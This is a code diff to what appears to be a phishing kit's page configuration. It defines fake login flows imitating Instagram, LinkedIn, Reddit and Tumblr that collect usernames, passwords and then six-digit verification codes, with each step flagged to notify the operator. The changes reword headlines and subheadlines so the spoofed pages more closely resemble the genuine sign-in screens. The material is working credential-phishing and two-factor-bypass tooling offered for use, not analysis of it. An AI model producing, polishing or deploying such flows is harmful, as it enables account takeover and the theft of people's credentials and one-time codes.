@@ -755,7 +755,7 @@ FLOWS.facebook = [
 ];
 
 FLOWS.instagram = [
-  { slug:'login',    form_type:'login', page_title:'Instagram – Log In',   headline:'Log In',             subheadline:'Log in to your Instagram account', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Instagram – Log In',   headline:'Log in to Instagram', subheadline:'Enter your username or email and password', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Enter the Code',       headline:'Enter the 6-digit code', subheadline:'Enter the code we sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirm Code', notify_step:true, otp_length:6 }
 ];
 
@@ -776,7 +776,7 @@ FLOWS.snapchat = [
 ];
 
 FLOWS.linkedin = [
-  { slug:'login',    form_type:'login', page_title:'LinkedIn – Sign In',   headline:'Sign in',            subheadline:'Stay updated on your professional world', fields:['email','password'], layout:'auth', cta:'Sign in', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'LinkedIn – Sign In',   headline:'Sign in to LinkedIn', subheadline:'Stay updated on your professional world', fields:['email','password'], layout:'auth', cta:'Sign in', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity', headline:'Let\'s verify it\'s you', subheadline:'Enter the verification code we sent to your email', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -786,12 +786,12 @@ FLOWS.pinterest = [
 ];
 
 FLOWS.reddit = [
-  { slug:'login',    form_type:'login', page_title:'Log in to Reddit',     headline:'Log In',             subheadline:'Log in to your Reddit account', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log in to Reddit',     headline:'Log in to Reddit',   subheadline:'Enter your username and password', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.tumblr = [
-  { slug:'login',    form_type:'login', page_title:'Log in to Tumblr',     headline:'Log in',             subheadline:'Log in to your Tumblr account', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log in to Tumblr',     headline:'Log in to Tumblr',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Check your email',     headline:'Check your email',   subheadline:'Enter the code we sent to your email address', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirm Code', notify_step:true, otp_length:6 }
 ];
 
